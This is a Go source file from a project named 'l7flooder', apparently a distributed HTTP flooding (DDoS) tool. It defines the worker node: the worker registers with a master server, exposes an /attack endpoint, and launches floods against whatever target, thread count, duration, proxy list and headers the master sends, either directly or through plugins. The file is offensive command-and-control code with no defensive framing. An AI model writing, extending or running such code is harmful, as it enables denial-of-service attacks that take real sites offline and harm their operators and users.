package cluster

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"time"
	"l7flooder/internal/attack"
	"l7flooder/pkg/plugins"
)

type Worker struct {
	ID     string
	Master string
	Addr   string
}

func NewWorker(id, master, addr string) *Worker {
	return &Worker{ID: id, Master: master, Addr: addr}
}

func (w *Worker) Register() error {
	info := WorkerInfo{ID: w.ID, Addr: w.Addr}
	data, _ := json.Marshal(info)
	resp, err := http.Post(w.Master+"/register", "application/json", bytes.NewReader(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return os.ErrInvalid
	}
	log.Printf("[worker %s] Registered on master %s", w.ID, w.Master)
	return nil
}

func (w *Worker) ListenAndServe() {
	http.HandleFunc("/attack", w.HandleAttack)
	log.Printf("[worker %s] Listening on %s", w.ID, w.Addr)
	log.Fatal(http.ListenAndServe(w.Addr, nil))
}

func (w *Worker) HandleAttack(rw http.ResponseWriter, r *http.Request) {
	var req AttackRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		rw.WriteHeader(400)
		return
	}
	log.Printf("[worker %s] Received attack: %+v", w.ID, req)
	go func() {
		if req.Method == "PLUGIN" && req.Params["plugin"] != "" {
			p, err := plugins.GetPlugin(req.Params["plugin"])
			if err != nil {
				log.Printf("[worker %s] Plugin error: %v", w.ID, err)
				return
			}
			p.Run(req.Target, req.Threads, req.Duration, req.Params)
		} else {
			attack.StartAttack(req.Target, req.Threads, req.Duration, req.Params["proxies"], req.Method, req.Params["headers"], nil)
		}
		log.Printf("[worker %s] Attack finished", w.ID)
	}()
	rw.WriteHeader(202)
} 